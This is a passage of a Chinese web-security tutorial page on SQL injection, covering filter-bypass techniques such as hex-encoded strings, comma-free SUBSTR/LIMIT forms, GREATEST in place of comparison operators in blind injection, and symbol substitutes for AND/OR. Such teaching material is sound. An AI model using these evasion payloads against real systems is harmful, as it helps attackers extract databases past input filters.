</code></pre></div><p>这个时候如果引号被过滤了，那么上面的 where 子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。</p><p>users 的十六进制的字符串是 7573657273。那么最后的 sql 语句就变为了：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x7573657273</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="逗号绕过" tabindex="-1"><a class="header-anchor" href="#逗号绕过" aria-hidden="true">#</a> 逗号绕过</h3><p>在使用盲注的时候，需要使用到<code>substr()</code>,<code>mid()</code>,<code>limit</code>。这些子句方法都需要使用到逗号。对于 substr() 和 mid() 这两个方法可以使用 <code>from for</code>的方式来解决：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><div class="custom-container tip"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">TIP</p><p>from for</p><p>语法：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>SUBSTRING<span class="token punctuation">(</span>str <span class="token keyword">FROM</span> pos <span class="token keyword">FOR</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>str 是将从其返回子字符串的字符串。</li><li>Pos 是子字符串的起始位置。</li><li>Len 是子字符串的长度，即从 str 提取的字符总数。</li></ul><p>示例：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>mysql<span class="token operator">&gt;</span> <span class="token keyword">Select</span> SUBSTRING<span class="token punctuation">(</span><span class="token string">&#39;foobarbar&#39;</span> <span class="token keyword">FROM</span> <span class="token number">4</span> <span class="token keyword">FOR</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------------------------------------+</span>
<span class="token operator">|</span> SUBSTRING<span class="token punctuation">(</span><span class="token string">&#39;foobarbar&#39;</span> <span class="token keyword">FROM</span> <span class="token number">4</span> <span class="token keyword">FOR</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------------------------------------+</span>
<span class="token operator">|</span> barba                               <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------------------------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
</code></pre></div></div><p>使用 join：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">;</span>
<span class="token comment"># 等价于</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span>
</code></pre></div><p>使用 like：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">;</span>
<span class="token comment"># 等价于</span>
<span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">&#39;r%&#39;</span><span class="token punctuation">;</span>
</code></pre></div><p>对于<code>limit</code>可以使用 <code>offset</code>来绕过：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token comment"># 等价于</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">0</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="比较绕过" tabindex="-1"><a class="header-anchor" href="#比较绕过" aria-hidden="true">#</a> 比较绕过</h3><p>过滤了<code>&lt;&gt;</code>：sqlmap 盲注经常使用 &lt;&gt;，使用 between 的脚本：同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到 greatest 来进行绕过了。最常见的一个盲注的 sql 语句：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">64</span><span class="token punctuation">;</span>
</code></pre></div><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用<code>greatest</code>来代替比较操作符了。</p><div class="custom-container tip"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">TIP</p><p>GREATEST</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>GREATEST<span class="token punctuation">(</span>X1<span class="token punctuation">,</span> X2<span class="token punctuation">,</span> X3<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>该方法接受语法中的 N 个参数，它返回最大值。</p></div><p>上面的 sql 语句可以变成：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> greatest<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">;</span>
</code></pre></div><p>使用<code>between and</code>。</p><h3 id="符号绕过" tabindex="-1"><a class="header-anchor" href="#符号绕过" aria-hidden="true">#</a> 符号绕过</h3><p>or and xor not绕过：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token operator">and</span><span class="token operator">=</span><span class="token operator">&amp;&amp;</span>  <span class="token operator">or</span><span class="token operator">=</span><span class="token operator">||</span>   <span class="token operator">xor</span><span class="token operator">=</span><span class="token operator">|</span>   <span class="token operator">not</span><span class="token operator">=</span><span class="token operator">!</span> 
</code></pre></div></div></div><footer class="page-meta"><div class="meta-item edit-link"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:inherit;"><path d="M2 26h28v2H2z" fill="currentColor"></path><path d="M25.4 9c.8-.8.8-2 0-2.8l-3.6-3.6c-.8-.8-2-.8-2.8 0l-15 15V24h6.4l15-15zm-5-5L24 7.6l-3 3L17.4 7l3-3zM6 22v-3.6l10-10l3.6 3.6l-10 10H6z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Edit this page<!--]--></span></span></div><div class="meta-item last-updated"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:inherit;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Last Updated 2023/5/14 21:23:26<!--]--></span></span></div></footer><nav class="page-nav"><p class="hasPrev hasNext inner"><span class="page-nav-item prev"> ← 任意文件上传</span><span class="page-nav-item next">XML 实体注入 → </span></p></nav><!----></main><!--]--><div class="page-catalog-container"><h5 class="tip">此页内容</h5><ul><!--[--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#漏洞原理" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="漏洞原理"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->漏洞原理<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#漏洞危害" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="漏洞危害"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->漏洞危害<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#修复建议" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="修复建议"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->修复建议<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#常见数据库" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="常见数据库"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->常见数据库<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#站库分离" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="站库分离"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->站库分离<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#mysql" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="MySQL"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->MySQL<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#常用函数" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="常用函数"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->常用函数<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#注入语句" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="注入语句"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->注入语句<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#文件写入" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="文件写入"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->文件写入<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#文件读取" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="文件读取"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->文件读取<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#dnslog-外带" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="DNSLog 外带"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->DNSLog 外带<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#绕过技术" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="绕过技术"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->绕过技术<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#空格绕过" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="空格绕过"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->空格绕过<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#括号绕过" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="括号绕过"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->括号绕过<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#引号绕过" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="引号绕过"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->引号绕过<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#逗号绕过" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="逗号绕过"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->逗号绕过<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#比较绕过" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="比较绕过"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->比较绕过<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html#符号绕过" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="符号绕过"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->符号绕过<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--]--></ul></div></div></div></div><!----><!----><!--]--></div>
    <script type="module" src="/assets/app-5881e473.js" defer></script>
  </body>
</html>
